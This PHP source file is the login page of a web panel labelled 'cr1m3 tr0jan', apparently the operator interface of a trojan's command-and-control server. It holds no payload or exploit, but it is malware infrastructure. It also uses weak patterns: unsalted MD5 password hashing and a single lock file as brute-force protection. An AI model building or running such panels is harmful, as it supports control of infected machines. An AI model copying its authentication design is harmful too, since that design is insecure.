<?php
	require_once("config.php");
	require_once("mod_login.php");
	require_once("security.php");

        //$user_agent = $_SERVER['HTTP_USER_AGENT'];
        //$referer = $_SERVER['HTTP_REFERER'];
		$user= __security_input($_POST['strUser'], 1);
		$pass = md5(__security_input($_POST['strPass'],1));
		$ip = $_SERVER['REMOTE_ADDR'];



		if(!empty($user) && !empty($pass)) {
			if($user == LOGIN_USER && $pass == LOGIN_PASS) {
				if(file_exists("data/lock.txt")) {
					unlink("data/lock.txt");
				}

				__login_new_session(md5($user . $pass . $ip));
				
			}
			else {
				if(file_exists("data/lock.txt"))
					__security_error("No brute force password");

				else {
					$f = fopen("data/lock.txt", "w");
					fwrite($f, "brute forcing");
					fclose($f);
				}
			}		
		}

	
?>

<html>
<head>
        <title>cr1m3 tr0jan...</title>
        <link type="text/css" rel="stylesheet" href="css/main.css">
</head>
<body>

<header>
	<h1>Cr1m3</h1>
</header>
<nav>
	<ul>
		<li><a></a></li>
		<li><a></a></li>
	</ul>
</nav>
<section>
	<article>
		<form action="./login.php" method="POST">
			<img src="./img/Fingerprint.jpg" height="150px" width="130px">
			User: <input type="text" name="strUser" autocomplete="off">
			Pass: <input type="password" name="strPass" autocomplete="off">
			<input type="submit" value="Login">
			<?php echo('<a class="browse_ip">Your IP: ' . $_SERVER['REMOTE_ADDR'] . '</a>'); ?>
		</form>	
	</article>

</section>

<footer>
	@cr1m3 // by h0ffy (JennyLab)
</footer>


</body>
</html>
